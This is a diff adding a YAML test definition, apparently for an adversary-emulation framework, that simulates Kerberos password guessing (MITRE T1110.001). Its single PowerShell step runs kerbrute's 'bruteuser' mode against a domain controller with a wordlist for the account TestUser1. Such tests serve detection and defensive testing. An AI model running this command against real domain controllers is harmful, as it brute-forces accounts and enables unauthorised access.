@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Password Brute User using Kerbrute Tool
+description: |
+    Bruteforce a single user's password from a wordlist
+args:
+    - name: domaincontroller
+      type: string
+      default: $ENV:userdnsdomain
+    - name: domain
+      type: string
+      default: $ENV:userdomain
+uuid: 59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.001: Password Guessing'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: password-brute-user-using-kerbrute-tool
+      inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc {{.Args.domaincontroller}} -d {{.Args.domain}} $env:temp\\bruteuser.txt TestUser1 \n"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
